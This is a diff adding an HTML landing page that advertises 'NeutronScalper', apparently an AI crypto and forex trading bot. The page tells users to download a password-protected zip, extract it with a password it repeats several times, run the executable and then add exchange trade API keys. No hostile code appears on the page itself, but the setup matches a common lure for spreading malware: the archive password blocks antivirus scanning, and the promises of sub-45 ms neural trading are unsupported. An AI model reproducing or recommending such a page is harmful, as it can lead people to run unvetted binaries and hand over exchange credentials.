@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>NeutronScalper — AI Scalping Engine for Crypto & Forex</title>
+<meta name="description" content="NeutronScalper is an AI-powered scalping engine for crypto and forex markets. Adaptive neural signals, sub-45ms execution and institutional-grade risk controls. Download for Windows 10/11 x64." />
+<meta name="keywords" content="ai scalper, ai trading bot, crypto scalper, forex scalper, algorithmic trading, high frequency trading, neural network trading, quantitative trading, windows trading bot" />
+<meta property="og:title" content="NeutronScalper — AI Scalping Engine" />
+<meta property="og:description" content="Adaptive neural signals, low-latency execution and institutional-grade risk controls for crypto & forex scalping." />
+<meta property="og:type" content="website" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#060911;
+    --bg2:#0b1020;
+    --card:#0f1526;
+    --card2:#131a2e;
+    --line:rgba(255,255,255,.08);
+    --txt:#e6ecff;
+    --muted:#8f9bbd;
+    --cyan:#22d3ee;
+    --violet:#8b5cf6;
+    --green:#22c55e;
+    --amber:#f59e0b;
+    --red:#ef4444;
+    --radius:18px;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  body{
+    font-family:'Inter',system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+    background:var(--bg);
+    color:var(--txt);
+    line-height:1.6;
+    -webkit-font-smoothing:antialiased;
+    overflow-x:hidden;
+  }
+  a{color:inherit;text-decoration:none}
+  .wrap{max-width:1140px;margin:0 auto;padding:0 22px}
+
+  /* ---------- Background glow ---------- */
+  .glow{
+    position:fixed;inset:0;z-index:-2;pointer-events:none;
+    background:
+      radial-gradient(700px 500px at 15% -5%, rgba(34,211,238,.18), transparent 60%),
+      radial-gradient(800px 600px at 90% 0%, rgba(139,92,246,.20), transparent 60%),
+      radial-gradient(900px 700px at 50% 110%, rgba(34,211,238,.10), transparent 60%),
+      linear-gradient(180deg,#060911,#070c18 40%,#060911);
+  }
+  .grid-bg{
+    position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.35;
+    background-image:
+      linear-gradient(rgba(255,255,255,.04) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,.04) 1px, transparent 1px);
+    background-size:56px 56px;
+    mask-image:radial-gradient(circle at 50% 30%, black, transparent 75%);
+  }
+
+  /* ---------- Nav ---------- */
+  nav{
+    position:sticky;top:0;z-index:50;
+    backdrop-filter:blur(14px);
+    background:rgba(6,9,17,.72);
+    border-bottom:1px solid var(--line);
+  }
+  .nav-inner{display:flex;align-items:center;justify-content:space-between;height:66px}
+  .brand{display:flex;align-items:center;gap:11px;font-weight:800;letter-spacing:.2px}
+  .brand .logo{
+    width:34px;height:34px;border-radius:10px;display:grid;place-items:center;
+    background:linear-gradient(135deg,var(--cyan),var(--violet));
+    box-shadow:0 0 22px rgba(34,211,238,.45);
+    font-size:18px;
+  }
+  .brand span small{display:block;font-size:10px;font-weight:600;color:var(--muted);letter-spacing:2px;text-transform:uppercase}
+  .nav-links{display:flex;gap:26px;font-size:14px;color:var(--muted)}
+  .nav-links a:hover{color:var(--cyan)}
+  .btn{
+    display:inline-flex;align-items:center;gap:9px;
+    padding:11px 20px;border-radius:12px;font-weight:700;font-size:14px;
+    border:1px solid transparent;cursor:pointer;transition:.2s;white-space:nowrap;
+  }
+  .btn-primary{
+    background:linear-gradient(135deg,var(--cyan),var(--violet));
+    color:#06101a;
+    box-shadow:0 8px 28px rgba(34,211,238,.28);
+  }
+  .btn-primary:hover{transform:translateY(-2px);box-shadow:0 14px 38px rgba(139,92,246,.42)}
+  .btn-ghost{border-color:var(--line);background:rgba(255,255,255,.03);color:var(--txt)}
+  .btn-ghost:hover{border-color:var(--cyan);color:var(--cyan)}
+
+  /* ---------- Hero ---------- */
+  header.hero{padding:84px 0 70px;position:relative}
+  .pill{
+    display:inline-flex;align-items:center;gap:9px;
+    padding:7px 15px;border-radius:999px;font-size:12.5px;font-weight:600;
+    border:1px solid rgba(34,211,238,.3);
+    background:rgba(34,211,238,.07);
+    color:var(--cyan);margin-bottom:24px;
+  }
+  .dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 10px var(--green);animation:pulse 2s infinite}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+  h1{
+    font-size:clamp(38px,6vw,66px);
+    line-height:1.05;font-weight:900;letter-spacing:-2px;margin-bottom:20px;
+  }
+  h1 .grad{
+    background:linear-gradient(100deg,var(--cyan) 10%,var(--violet) 70%);
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+  }
+  .lead{font-size:clamp(16px,2vw,19px);color:var(--muted);max-width:680px;margin-bottom:34px}
+  .cta{display:flex;gap:14px;flex-wrap:wrap;align-items:center}
+  .meta{margin-top:18px;font-size:13px;color:var(--muted)}
+  .meta code{font-family:'JetBrains Mono',monospace;background:rgba(255,255,255,.06);padding:2px 8px;border-radius:6px;color:var(--cyan)}
+
+  /* ---------- Stats ---------- */
+  .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-top:56px}
+  .stat{
+    background:linear-gradient(180deg,var(--card),var(--bg2));
+    border:1px solid var(--line);border-radius:var(--radius);padding:20px;
+  }
+  .stat b{display:block;font-size:26px;font-weight:800;background:linear-gradient(90deg,var(--cyan),var(--violet));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .stat span{font-size:12.5px;color:var(--muted)}
+
+  /* ---------- Sections ---------- */
+  section{padding:74px 0}
+  .sec-head{text-align:center;max-width:720px;margin:0 auto 46px}
+  .kicker{font-size:12px;letter-spacing:2.5px;text-transform:uppercase;color:var(--cyan);font-weight:700;margin-bottom:12px}
+  h2{font-size:clamp(28px,4vw,40px);font-weight:800;letter-spacing:-1px;margin-bottom:14px}
+  .sec-head p{color:var(--muted)}
+
+  /* ---------- Cards ---------- */
+  .grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+  .card{
+    background:linear-gradient(180deg,var(--card),var(--bg2));
+    border:1px solid var(--line);border-radius:var(--radius);padding:26px;
+    transition:.25s;position:relative;overflow:hidden;
+  }
+  .card:before{
+    content:"";position:absolute;top:0;left:0;right:0;height:2px;
+    background:linear-gradient(90deg,transparent,var(--cyan),transparent);opacity:0;transition:.25s;
+  }
+  .card:hover{transform:translateY(-4px);border-color:rgba(34,211,238,.35);box-shadow:0 18px 44px rgba(0,0,0,.45)}
+  .card:hover:before{opacity:1}
+  .ico{
+    width:46px;height:46px;border-radius:12px;display:grid;place-items:center;font-size:22px;margin-bottom:16px;
+    background:rgba(34,211,238,.1);border:1px solid rgba(34,211,238,.25);
+  }
+  .card h3{font-size:17px;font-weight:700;margin-bottom:8px}
+  .card p{font-size:14px;color:var(--muted)}
+
+  /* ---------- Table ---------- */
+  .table-wrap{border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;background:var(--card)}
+  table{width:100%;border-collapse:collapse;font-size:14px}
+  th,td{padding:14px 18px;text-align:left;border-bottom:1px solid var(--line)}
+  th{background:rgba(255,255,255,.03);font-size:12px;letter-spacing:1px;text-transform:uppercase;color:var(--muted);font-weight:700}
+  tr:last-child td{border-bottom:none}
+  td:first-child{font-weight:600}
+  .ok{color:var(--green);font-weight:700}
+  .warn{color:var(--amber);font-weight:700}
+
+  /* ---------- Download box ---------- */
+  .dl-box{
+    background:linear-gradient(135deg,rgba(34,211,238,.10),rgba(139,92,246,.10));
+    border:1px solid rgba(34,211,238,.28);
+    border-radius:24px;padding:40px;display:grid;grid-template-columns:1.3fr 1fr;gap:36px;align-items:center;
+  }
+  .dl-box h3{font-size:26px;font-weight:800;margin-bottom:10px}
+  .dl-box p{color:var(--muted);font-size:15px;margin-bottom:22px}
+  .dl-info{background:rgba(6,9,17,.6);border:1px solid var(--line);border-radius:16px;padding:22px}
+  .row{display:flex;justify-content:space-between;gap:14px;padding:9px 0;border-bottom:1px dashed rgba(255,255,255,.08);font-size:13.5px}
+  .row:last-child{border-bottom:none}
+  .row span:first-child{color:var(--muted)}
+  .row span:last-child{font-family:'JetBrains Mono',monospace;color:var(--cyan);font-weight:600}
+
+  /* ---------- Steps ---------- */
+  .steps{display:grid;grid-template-columns:repeat(2,1fr);gap:16px;counter-reset:s}
+  .step{
+    background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px 22px 22px 64px;position:relative;
+  }
+  .step:before{
+    counter-increment:s;content:counter(s);
+    position:absolute;left:18px;top:20px;
+    width:32px;height:32px;border-radius:9px;display:grid;place-items:center;
+    background:linear-gradient(135deg,var(--cyan),var(--violet));color:#06101a;font-weight:800;font-size:14px;
+  }
+  .step b{display:block;margin-bottom:4px;font-size:15px}
+  .step span{font-size:13.5px;color:var(--muted)}
+  .step code{font-family:'JetBrains Mono',monospace;background:rgba(255,255,255,.07);padding:1px 6px;border-radius:5px;color:var(--cyan);font-size:12.5px}
+
+  /* ---------- Warning ---------- */
+  .warn-box{
+    display:flex;gap:14px;align-items:flex-start;
+    background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.3);
+    border-radius:16px;padding:18px 20px;font-size:14px;color:#f6d78a;
+  }
+  .warn-box b{color:var(--amber)}
+
+  /* ---------- Footer ---------- */
+  footer{border-top:1px solid var(--line);padding:38px 0;color:var(--muted);font-size:13px}
+  .foot-inner{display:flex;justify-content:space-between;gap:20px;flex-wrap:wrap;align-items:center}
+  .foot-links{display:flex;gap:22px}
+  .foot-links a:hover{color:var(--cyan)}
+
+  /* ---------- Responsive ---------- */
+  @media(max-width:900px){
+    .grid3,.steps{grid-template-columns:1fr}
+    .stats{grid-template-columns:repeat(2,1fr)}
+    .dl-box{grid-template-columns:1fr;padding:28px}
+    .nav-links{display:none}
+  }
+  @media(max-width:520px){
+    .stats{grid-template-columns:1fr}
+    header.hero{padding:56px 0 40px}
+  }
+</style>
+</head>
+<body>
+<div class="glow"></div>
+<div class="grid-bg"></div>
+
+<!-- ================= NAV ================= -->
+<nav>
+  <div class="wrap nav-inner">
+    <div class="brand">
+      <div class="logo">⚡</div>
+      <span>NeutronScalper<small>AI Scalping Engine</small></span>
+    </div>
+    <div class="nav-links">
+      <a href="#features">Features</a>
+      <a href="#requirements">Requirements</a>
+      <a href="#download">Download</a>
+      <a href="#install">Install</a>
+      <a href="#faq">FAQ</a>
+    </div>
+    <a class="btn btn-primary" href="#download">⬇ Download</a>
+  </div>
+</nav>
+
+<!-- ================= HERO ================= -->
+<header class="hero">
+  <div class="wrap">
+    <div class="pill"><span class="dot"></span> Windows 10 / 11 x64 · Engine v2.4.1</div>
+    <h1>Scalp the market<br><span class="grad">at neural speed.</span></h1>
+    <p class="lead">
+      NeutronScalper is an AI-powered scalping engine for crypto and forex markets.
+      Adaptive neural signals, sub-45&nbsp;ms execution and institutional-grade risk controls —
+      packaged as a single native Windows executable.
+    </p>
+    <div class="cta">
+      <a class="btn btn-primary" href="#download">⬇ Download NeutronScalper</a>
+      <a class="btn btn-ghost" href="#features">Explore features</a>
+    </div>
+    <div class="meta">
+      Archive: <code>NeutronScalper-v2.4.1.zip</code> · Password: <code>8025381933</code> · Exe: <code>NeutronScalper.exe</code>
+    </div>
+
+    <div class="stats">
+      <div class="stat"><b>&lt;45 ms</b><span>Target execution latency</span></div>
+      <div class="stat"><b>3</b><span>Ensemble neural models</span></div>
+      <div class="stat"><b>6+</b><span>Supported market classes</span></div>
+      <div class="stat"><b>100%</b><span>Self-contained binary</span></div>
+    </div>
+  </div>
+</header>
+
+<!-- ================= FEATURES ================= -->
+<section id="features">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="kicker">Capabilities</div>
+      <h2>Built for the shortest timeframes</h2>
+      <p>Every component is optimized for reaction speed, consistency and capital preservation.</p>
+    </div>
+
+    <div class="grid3">
+      <div class="card">
+        <div class="ico">🧠</div>
+        <h3>Ensemble Neural Signals</h3>
+        <p>Three independently trained models vote on every setup. High disagreement suppresses the trade — no blind entries.</p>
+      </div>
+      <div class="card">
+        <div class="ico">🌊</div>
+        <h3>Regime-Aware Routing</h3>
+        <p>The engine classifies trending, ranging and shock regimes and routes each signal to the matching sub-model.</p>
+      </div>
+      <div class="card">
+        <div class="ico">📖</div>
+        <h3>Microstructure Features</h3>
+        <p>Order-book imbalance, trade-flow delta, spread velocity and queue pressure feed the feature pipeline in real time.</p>
+      </div>
+      <div class="card">
+        <div class="ico">⚡</div>
+        <h3>Low-Latency Execution</h3>
+        <p>Smart order routing with child-order splitting, retry ladder and slippage guard keeps fills clean.</p>
+      </div>
+      <div class="card">
+        <div class="ico">🛡️</div>
+        <h3>Hard Risk Ceilings</h3>
+        <p>Equity floor, daily drawdown brake, notional caps, correlation filter and volatility throttle — all enforced.</p>
+      </div>
+      <div class="card">
+        <div class="ico">📊</div>
+        <h3>Full Observability</h3>
+        <p>Live signal log, per-trade rationale, expectancy dashboard and CSV / JSON export for external analysis.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= REQUIREMENTS ================= -->
+<section id="requirements">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="kicker">System</div>
+      <h2>System requirements</h2>
+      <p>Native Windows binary — no Python, Node.js or runtime dependencies required.</p>
+    </div>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Component</th><th>Minimum</th><th>Recommended</th></tr></thead>
+        <tbody>
+          <tr><td>OS</td><td>Windows 10 x64 (1909+)</td><td>Windows 11 x64 (23H2+)</td></tr>
+          <tr><td>CPU</td><td>4 cores / 8 threads</td><td>8 cores / 16 threads, 3.8 GHz+</td></tr>
+          <tr><td>RAM</td><td>8 GB</td><td>16–32 GB</td></tr>
+          <tr><td>Disk</td><td>500 MB free</td><td>2 GB SSD free</td></tr>
+          <tr><td>Network</td><td>20 Mbps stable</td><td>100 Mbps, &lt; 40 ms to exchange</td></tr>
+          <tr><td>Runtime</td><td class="ok">None required</td><td class="ok">None required</td></tr>
+          <tr><td>Admin rights</td><td class="ok">Not required</td><td class="ok">Not required</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<!-- ================= DOWNLOAD ================= -->
+<section id="download">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="kicker">Get the build</div>
+      <h2>Download NeutronScalper</h2>
+      <p>The Windows build is distributed as a password-protected archive.</p>
+    </div>
+
+    <div class="dl-box">
+      <div>
+        <h3>⬇ NeutronScalper for Windows</h3>
+        <p>Version 2.4.1 · Windows 10 / 11 x64 · Self-contained executable · No installer</p>
+        <a class="btn btn-primary" href="downloads/NeutronScalper-v2.4.1.zip" download>Download archive</a>
+        <a class="btn btn-ghost" href="https://github.com/Neutronchimansion/neutron-ai-scalper" style="margin-left:10px">View repository</a>
+      </div>
+      <div class="dl-info">
+        <div class="row"><span>Archive</span><span>NeutronScalper-v2.4.1.zip</span></div>
+        <div class="row"><span>Password</span><span>8025381933</span></div>
+        <div class="row"><span>Executable</span><span>NeutronScalper.exe</span></div>
+        <div class="row"><span>Platform</span><span>Windows x64</span></div>
+        <div class="row"><span>Checksums</span><span>checksums.txt</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= INSTALL ================= -->
+<section id="install">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="kicker">Setup</div>
+      <h2>Install in six steps</h2>
+      <p>From download to first dry-run in under five minutes.</p>
+    </div>
+
+    <div class="steps">
+      <div class="step"><b>Download the archive</b><span>Click <code>Download archive</code> above or open the <code>downloads/</code> folder in the repository.</span></div>
+      <div class="step"><b>Extract with password</b><span>Use 7-Zip or WinRAR and enter <code>8025381933</code> when prompted.</span></div>
+      <div class="step"><b>Verify the hash</b><span>Compare <code>Get-FileHash .\NeutronScalper.exe -Algorithm SHA256</code> with <code>checksums.txt</code>.</span></div>
+      <div class="step"><b>Launch the executable</b><span>Run <code>NeutronScalper.exe</code> as a standard user. Administrator rights are not needed.</span></div>
+      <div class="step"><b>Run dry-run mode</b><span>Load a preset profile and validate connectivity with simulated fills.</span></div>
+      <div class="step"><b>Connect & go live</b><span>Add read + trade API keys (withdrawals disabled), then switch to live mode.</span></div>
+    </div>
+
+    <div class="warn-box" style="margin-top:22px">
+      <span style="font-size:20px">🔐</span>
+      <div><b>Security notice.</b> Never enable withdrawal permissions on exchange API keys. Verify the SHA-256 hash after extraction. The archive password protects against casual tampering, not against a determined attacker — always verify integrity.</div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= FAQ ================= -->
+<section id="faq">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="kicker">Questions</div>
+      <h2>Frequently asked</h2>
+      <p>Quick answers to the most common questions.</p>
+    </div>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Question</th><th>Answer</th></tr></thead>
+        <tbody>
+          <tr><td>What is the archive password?</td><td><code style="font-family:'JetBrains Mono',monospace;color:var(--cyan)">8025381933</code></td></tr>
+          <tr><td>Is there an installer?</td><td>No. Extract and run <code>NeutronScalper.exe</code>.</td></tr>
+          <tr><td>Does it need Python or Node.js?</td><td>No. The binary is fully self-contained.</td></tr>
+          <tr><td>Can I run it on macOS or Linux?</td><td>The official build targets Windows 10/11 x64.</td></tr>
+          <tr><td>Does it work on demo accounts?</td><td>Yes — dry-run and demo are strongly recommended first.</td></tr>
+          <tr><td>Where are logs stored?</td><td>In the <code>logs/</code> folder next to the executable.</td></tr>
+          <tr><td>Why was my trade rejected?</td><td>Open the Signal Log — the rejection reason is recorded.</td></tr>
+          <tr><td>Are my API keys safe?</td><td>Encrypted at rest with a machine-bound key. See SECURITY.md.</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<!-- ================= FOOTER ================= -->
+<footer>
+  <div class="wrap foot-inner">
+    <div>© <span id="y"></span> NeutronScalper · Built by Neutronchimansion</div>
+    <div class="foot-links">
+      <a href="https://github.com/Neutronchimansion/neutron-ai-scalper">Repository</a>
+      <a href="https://github.com/Neutronchimansion/neutron-ai-scalper/blob/main/SECURITY.md">Security</a>
+      <a href="#download">Download</a>
+    </div>
+  </div>
+  <div class="wrap" style="margin-top:18px;font-size:12px;color:#6b7794;max-width:900px">
+    Trading leveraged instruments carries a high level of risk and can result in the loss of all invested capital.
+    NeutronScalper is software, not financial advice. Past performance is not indicative of future results.
+  </div>
+</footer>
+
+<script>
+  document.getElementById('y').textContent = new Date().getFullYear();
+</script>
+</body>
+</html>
